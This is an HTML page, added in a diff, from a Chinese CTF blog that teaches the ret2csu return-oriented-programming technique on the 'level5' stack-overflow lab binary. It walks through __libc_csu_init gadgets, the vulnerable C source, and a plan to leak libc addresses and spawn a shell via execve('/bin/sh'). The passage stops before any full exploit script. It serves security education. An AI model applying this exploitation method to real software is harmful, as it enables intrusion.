@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="hollk">
+
+
+    <meta name="subtitle" content="ret2text">
+
+
+    <meta name="description" content="说人话，讲清楚，负责到底">
+
+
+    <meta name="keywords" content="ret2text,二进制,pwn,ctf-wiki">
+
+
+<title>好好说话之ret2csu | Hollk&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Hollk&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">主页</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Hollk&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">主页</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">好好说话之ret2csu</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">hollk</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 29, 2020&nbsp;&nbsp;15:59:22</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA/">二进制--栈溢出</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>##一、x64寄存器</p>
+<p>在64位程序中，函数的前6各参数是通过寄存器传递的，可以看到rdi作为第一个参数，rsi作为第二个参数，rdx作为第三个参数，rcx作为第四个参数，r8作为第五个参数，r9作为第六个参数。也就是说在函数调用参数的时候会依次在六个寄存器中寻找，如果参数多余6个，那么就需要在栈中寻找。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">63                                 31                 15          7        0</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">| %rax                             | %eax             | %ax       | %a1     |返回值</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %rbx                             | %ebx             | %bx       | %b1     |被调用者保存</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %rcx                             | %ecx             | %cx       | %c1     |第4个参数</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %rdx                             | %edx             | %dx       | %d1     |第3个参数</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %rsi                             | %esi             | %si       | %si1    |第2个参数</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %rdi                             | %edi             | %di       | %di1    |第1个参数</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %rbp                             | %ebp             | %bp       | %bp1    |被调用者保存</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %rsp                             | %esp             | %sp       | %sp1    |栈指针</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %r8                              | %e8d             | %r8w      | %r8b    |第5个参数</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %r9                              | %e9d             | %r9w      | %r9b    |第6个参数</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %r10                             | %e10d            | %r10w     | %r10b   |调用者保存</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %r11                             | %e11d            | %r11w     | %r11b   |调用者保存</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %r12                             | %e12d            | %r12w     | %r12b   |被调用者保存</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %r13                             | %e13d            | %r13w     | %r13b   |被调用者保存</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %r14                             | %e14d            | %r14w     | %r14b   |被调用者保存</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| %r15                             | %e15d            | %r15w     | %r15b   |被调用者保存</span><br><span class="line">+---------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>##二、libc_csu_init以及gadget</p>
+<p>既然参数存放在寄存器中，那么如果想要对寄存器操作有两种方法，一种是在栈中部署shellcode控制寄存器的pop操作，但是如果开启了NX保护的话就无法在栈中进行插入shellcode操作。另外一种方法就是利用gadget</p>
+<p>做完这个例子你会更加了解gadget的含义，gadget其实本质上就是程序本身或者libc中存在的一些汇编指令，比如pop ebx，pop eax等，每一条指令对应着一段地址，那么将这些gadget地址部署到栈中，在sp指针指向该gadget地址的时候发现这个地址里面是一条指令而不是一个数据，那么esp就会将该地址弹给ip指针，ip指针会执行该地址内存放的汇编指令，这样就完成了对寄存器的操作</p>
+<p>ret2csu这种方法就是利用了x64下的__libc_csu_init函数中的gadget，也就是这个函数中的汇编指令。这个函数是用来对libc进行初始化操作的，一般的程序都会调用libc里面的函数，那么一旦掉用libc里面的函数就必须经过libc初始化的步骤，那么 libc_csu_init函数就一定存在</p>
+<p>下面通过蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 这道题来进行讲解，首先通过ida查找一下__libc_csu _init函数的位置（<strong><em>不同版本的libc的函数位置以及函数中的汇编指令会不一样</em></strong>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005A0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005A0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0 var_30          &#x3D; qword ptr -30h</span><br><span class="line">.text:00000000004005A0 var_28          &#x3D; qword ptr -28h</span><br><span class="line">.text:00000000004005A0 var_20          &#x3D; qword ptr -20h</span><br><span class="line">.text:00000000004005A0 var_18          &#x3D; qword ptr -18h</span><br><span class="line">.text:00000000004005A0 var_10          &#x3D; qword ptr -10h</span><br><span class="line">.text:00000000004005A0 var_8           &#x3D; qword ptr -8</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0                 mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5                 mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA                 lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1                 lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8                 mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD                 mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2                 mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7                 mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC                 sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0                 sub     rbp, r12</span><br><span class="line">.text:00000000004005D3                 mov     r13d, edi</span><br><span class="line">.text:00000000004005D6                 mov     r14, rsi</span><br><span class="line">.text:00000000004005D9                 sar     rbp, 3</span><br><span class="line">.text:00000000004005DD                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E0                 call    _init_proc</span><br><span class="line">.text:00000000004005E5                 test    rbp, rbp</span><br><span class="line">.text:00000000004005E8                 jz      short loc_400606</span><br><span class="line">.text:00000000004005EA                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64j</span><br><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005FD                 add     rbx, 1</span><br><span class="line">.text:0000000000400601                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604                 jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48j</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br><span class="line">.text:0000000000400628 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>如何选取合适gadget呢？首先你要根据你需要控制的寄存器来进行选择，比如在开启NX保护的情况下，只需要将rdx寄存器中的值交给r15寄存器这样一步操作，那么就可以将0x00000000004005DD这个地址通过gets、read、strcpy等函数部署到栈中。</p>
+<p>在__libc_csu_init函数中经常利用的有如下几点：</p>
+<ul>
+<li>从0x0000000000400606到0x0000000000400628这段地址，可以利用栈溢出构造栈上数据来控制rbx、rbp、r12、r13、r14、r15 寄存器的数据，并且最后还有ret的返回操作，可以通过溢出将ret原有的地址覆盖成我们想要跳转的地址</li>
+<li>从0x00000000004005F0到0x00000000004005F9这段地址，可以将r15中的值赋给rdx，将r14中的值赋给rsi，将r13中的值赋给edi（其实这里赋给的是rdi的低32位，高32位寄存器的值为0，所以可以达到控制rdi的目的，但是只能控制低32位），这三个寄存器就是0x64函数调用中的前三个参数，如果需要用到含有三个参数的函数的时候，那么这一段gadget就很有用，最后又一个call命令，call命令指向的地址是由r12寄存器和rbx寄存器联合控制的，那么可以通过控制r12和rbx来call到我们想要到达的地址</li>
+<li>从0x00000000004005FD到0x0000000000400604这段地址，可以控制rbx和rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_4005F0，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1</li>
+</ul>
+<p><strong><em>这个部分在下面的构造payload环节中需要用到，如果payload构造看不懂，回到这里将上面的三点手动抄写20+遍，抄到你理解为止</em></strong></p>
+<p>##三、ret2csu</p>
+<p>题目路径：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hollk<span class="variable">@ubuntu</span><span class="symbol">:~/ctf-challenges/pwn/stackoverflow/zhengmin1989-ROP_STEP_BY_ST4f8b5/linux_x64/</span><span class="number">5</span>/level5</span><br></pre></td></tr></table></figure>
+
+<p>C代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	<span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">write</span>(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">	vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先使用checksec查看一下程序的保护机制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec level5</span></span><br><span class="line">[*] '/home/hollk/ctf-challenges/pwn/stackoverflow/zhengmin1989-ROP_STEP_BY_STEP-e34f8b5/linux_x64/5/level5'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>检查后发现64位程序，NX保护开启，所以不能再栈中添加shellcode或者进行跳转实现，IDA查看一下程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现存在read函数，read函数不会检查输入的字符串长度，所以可以进行溢出。可以看到buf变量距离sp指针0h个字节，也就是说buf变量的起始地址就是sp地址。buf变量距离bp指针80h，也就是说整个可控制的栈空间就是buf变量的起始地址到ebp的地址0x80个字节，因为是64位程序，所以后面在saved bp的位置还有8个字节，那么从变量的起始位置到ret返回有0x80+8个字节</p>
+<p>通过ida检查程序并没有发现system函数和/bin/sh字符串，二者都需要自己构造（system函数不起效果的话可以使用execve来获取shell）</p>
+<p>构造exp思路如下：</p>
+<ul>
+<li>利用LibcSearcher工具找到write函数got表地址、read函数got表地址、bss段地址和main函数地址</li>
+<li>利用栈溢出执行libc_csu_init函数中的gadget，部署write函数参数并通过write函数got表地址调用write函数打印自身的函数地址，最后重新执行main函数为接下来做准备</li>
+<li>利用LibcSearcher工具获取对应的libc版本以及execve函数地址</li>
+<li>再次利用栈溢出执行libc_csu_init函数中的gadget，通过read函数got表地址调用read函数向bss段写入execve函数地址以及/bin/sh字符串，并再次重新执行main函数为接下来做准备</li>
+<li>利用栈溢出执行libc_csu_init函数中的gadget，执行写入bss段的execve(‘/bin/sh’)</li>
+</ul>
+<p>##四、payload构造流程：</p>
+<p>在构造exp之前需要将payload构造出来</p>
+<p>首先使用0x80+8个字节填满栈空间至ret返回地址，然后进行覆盖</p>
+<p>接下来通过调用write在got表中的地址来调用write函数，那么在构造write函数的参数的时候就需要知道write函数的函数结构</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span> <span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> * buf, <span class="keyword">size_t</span> count)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>函数说明：write()会把参数buf所指的内存写入count个字节到参数放到所指的文件内，fd为文件描述符，fd为1时为标准输出</p>
+<p>所以我们需要在寄存其中部署三个参数，并且在最后调用write在got表中的地址进而调用write函数打印出自身函数地址：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------</span><br><span class="line">| 寄存器和指令 |      存储数据      | </span><br><span class="line">----------------------------------</span><br><span class="line">|    rdi     |        1          | rdi存放第一参数，标准输出文件描述符：fd = 1</span><br><span class="line">----------------------------------</span><br><span class="line">|    rsi     |     write<span class="emphasis">_got     | rsi存放第二参数，需要输出的内存地址：*buf = write_</span>got</span><br><span class="line">----------------------------------</span><br><span class="line">|    rdx     |        8          | rdx存放第三参数，输出字节数：count = 8</span><br><span class="line">----------------------------------</span><br><span class="line">|    call    |     write<span class="emphasis">_got     | call write_</span>got调用write函数</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以发现在libc_csu_init函数有可以进行寄存器之间赋值并且最后有调用的gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>
+
+<p>可以通过这段gadget看出，如果想要在rdx、rsi和edi中部署参数，首先需要在r15中部署count，在r14中部署buf，在r13中部署fd。并且如果想要在最后使用call命令调用write_got地址，那么就需要对r12和rbx做出调整，如果将write_got地址部署在r12中，并且将0部署在rbx中，那么r12+rbx<em>8=write_got + 0\</em>8=write_got，就可以达到call write_got的目的了，所以需要补充的条件如下</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">|<span class="string">   寄存器    </span>|<span class="string">      存储数据       </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    rbx     </span>|<span class="string">         0          </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    r12     </span>|<span class="string">     write_got      </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    r13     </span>|<span class="string">         1          </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    r14     </span>|<span class="string">     write_got      </span>|<span class="string"> </span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line">|<span class="string">    r15     </span>|<span class="string">         8          </span>|<span class="string"> </span></span><br><span class="line"><span class="string">-----------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以发现在libc_csu_init函数有正好可以利用的gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在这段gadget的结尾，即0x0000000000400628位置为ret跳转，那么正好可以接到前面给第一、二、三参数寄存器赋值的gadget，即：(如果在这蒙蔽了，看一下最开始的长篇libc_csu_init函数汇编代码)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005FD                 add     rbx, 1</span><br><span class="line">.text:0000000000400601                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604                 jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48j</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br></pre></td></tr></table></figure>
+
+<p>那么在ret位置（0x0000000000400628）就应该部署0x00000000004005F0这个地址，即赋值gadget的开头，好让接下来的参数赋值顺利进行</p>
+<p>还有一点需要注意的是从0x0000000000400606到0x000000000040061F，给bx、bp、12、13、14、15寄存器赋值的时候都是使用sp指针偏移实现的，所以还需要考虑起始rbx赋值时rsp+38h+var_30后面加的var_30的值是多少，这个时候就需要使用edb进行动态调试了，结果如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000:00400606    				48 8b 5c 24 08     				mov rbx, [rsp+8]</span><br><span class="line">00000000:0040060b		 				48 8b 6c 24 10		 				mov rbp, [rsp+0x10]</span><br><span class="line">00000000:00400610		 				4c 8b 6c 24 18		 				mov r12, [rsp+0x18]</span><br><span class="line">00000000:00400615		 				4c 8b 74 24 20		 				mov r13, [rsp+0x20]</span><br><span class="line">00000000:0040061a		 				4c 8b 7c 24 28		 				mov r14, [rsp+0x28]</span><br><span class="line">00000000:0040061f		 				4c 8b 7c 24 30		 				mov r15, [rsp+0x30]</span><br><span class="line">00000000:00400624		 				48 83 c4 38			 					add rsp, 0x38</span><br><span class="line">00000000:00400628		 				c3								 				ret</span><br></pre></td></tr></table></figure>
+
+<p>所以可以看到是从rsp的下8个字节去赋值的，所以需要8个字节填满跳过的部分（<strong><em>注意！这个偏移不同版本的libc会有偏差，有些版本甚至没有偏移，请根据自身环境动态调试查看</em></strong>）</p>
+<p>最后还需要重新调用main函数，为接下来的操作做准备。但发现第二次利用的gadget中并没有ret返回指令，所以只能使用最下面的ret做为main函数地址存放位置。中间就需要对rbp的值做处理，从0x00000000004005FD到0x0000000000400604这段地址，可以控制rbx和rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_4005F0，进而可以继续执行下面的汇编程序，所以我们将rbp的值设为1。我们可以看到在call指令后面的汇编指令中sp指针的位置并没有发生变化，都是使用偏移的方式进行数据交互的。最后的0x0000000000400624位置做了sp的平衡堆栈，把sp指针位置加了0x38个字节，最后才是ret返回地址，还需要使用0x38个字节来进行填充，最后在ret返回指令处部署main函数地址</p>
+<p>下面是所有寄存器存放内容</p>
